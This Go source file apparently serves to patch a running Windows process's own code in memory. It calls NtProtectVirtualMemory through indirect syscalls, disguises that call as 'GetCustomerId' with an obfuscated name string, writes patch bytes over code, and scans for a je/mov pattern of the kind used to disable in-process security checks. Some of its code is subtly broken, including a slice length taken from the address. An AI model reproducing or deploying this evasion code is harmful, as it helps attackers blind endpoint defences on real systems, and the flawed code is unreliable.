package main

import (
	"errors"
	"unsafe"
	"fmt"

	"github.com/almounah/superdeye"
	"golang.org/x/sys/windows"
)



func GetCustomerId(handleProcess windows.Handle, baseAddress uintptr, numberbyteToProtect uintptr, newProtect uint32, oldProtect *uint32) (NTSTATUS uint32, err error) {
	NTSTATUS, err = superdeye.SuperdSyscall(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i' , 'r' , 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}),
		uintptr(handleProcess),
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&numberbyteToProtect)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return NTSTATUS, err
}

func PatchFunction(address uintptr, pShellcode []byte) error {

    var oldprotect uint32
    ntstatus, err := GetCustomerId(windows.Handle(^uintptr(0)), address, uintptr(len(pShellcode)), windows.PAGE_READWRITE, &oldprotect)
    if ntstatus != 0 {
        return errors.New(fmt.Sprintf("Error NTSTATUS %d", ntstatus))
    }
    if err != nil {
        return err
    }

    dst := unsafe.Slice((*byte)(unsafe.Pointer(address)), address)
    copy(dst, pShellcode)

    var newprotect uint32
    ntstatus, err = GetCustomerId(windows.Handle(^uintptr(0)), address, uintptr(len(pShellcode)), windows.PAGE_EXECUTE_READ, &newprotect)
    if ntstatus != 0 {
        return errors.New(fmt.Sprintf("Error NTSTATUS %d", ntstatus))
    }
    if err != nil {
        return err
    }
    return nil

}

func SearchForJeInstructionFromAddress(startAddress uintptr) uintptr {
    x64_RET_INSTRUCTION_OPCODE := 0xC3
    x64_INT3_INSTRUCTION_OPCODE := 0xCC


    i := 0
    address := startAddress
    addressPlusOne := startAddress + uintptr(i+1)*uintptr(unsafe.Sizeof(byte(0)))
    addressPlusTwo := startAddress + uintptr(i+2)*uintptr(unsafe.Sizeof(byte(0)))
    for {
        // CHeck Opcode
        opcode := *(*byte)(unsafe.Pointer(address))
        Println(fmt.Sprintf("Opcode %0X", opcode))
        opcodePlusOne := *(*byte)(unsafe.Pointer(addressPlusOne))
        opcodePlusTwo := *(*byte)(unsafe.Pointer(addressPlusTwo))
        Println(fmt.Sprintf("Opcode+1 %0X", opcodePlusOne))
        if opcode == byte(x64_RET_INSTRUCTION_OPCODE) && opcodePlusOne == byte(x64_INT3_INSTRUCTION_OPCODE) && opcodePlusTwo == byte(x64_INT3_INSTRUCTION_OPCODE){
            addresdebug := startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
            Println(fmt.Sprintf("Found ret address at %0x", addresdebug))
            break
        }

        // INcrement address
        i++
        address = startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
        addressPlusOne = startAddress + uintptr(i+1)*uintptr(unsafe.Sizeof(byte(0)))
        addressPlusTwo = startAddress + uintptr(i+2)*uintptr(unsafe.Sizeof(byte(0)))
    }
    var jeAddress uintptr
    for i > 0 {
        addressAtI := startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
        if CheckJeAddress(addressAtI) {
            jeAddress = addressAtI
            Println(fmt.Sprintf("Found je address at %0x", jeAddress))

            break
        }
        i--
    }
    return jeAddress
}

func CheckJeAddress(address uintptr) bool {
    x64_JE_INSTRUCTION_OPCODE := 0x74
    x64_MOV_INSTRUCTION_OPCODE := 0xB8
    opcode := *(*byte)(unsafe.Pointer(address))
    Println(fmt.Sprintf("Opcode at je %x", opcode))
    if opcode != byte(x64_JE_INSTRUCTION_OPCODE) {
        return false
    }
    // Skip je address (size of byte 1
    jumpAddress := address + uintptr(1)
    dwOffset := *(*byte)(unsafe.Pointer(jumpAddress))

    pMov := address + uintptr(dwOffset) + 2*uintptr(unsafe.Sizeof(byte(0)))
    Println(fmt.Sprintf("MOv address at %0x", pMov))
    opcodeAtMove := *(*byte)(unsafe.Pointer(pMov))
    Println(fmt.Sprintf("Opcode at mov %x", opcodeAtMove))
    return opcodeAtMove == byte(x64_MOV_INSTRUCTION_OPCODE)
}

func memcmp(address uintptr, target []byte) bool {
    for i := 0; i < len(target); i++ {
        addressAtI := address + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
        opcodeAtI := *(*byte)(unsafe.Pointer(addressAtI))
        if opcodeAtI != target[i] {
            return false
        }
        
    }
    return true
}
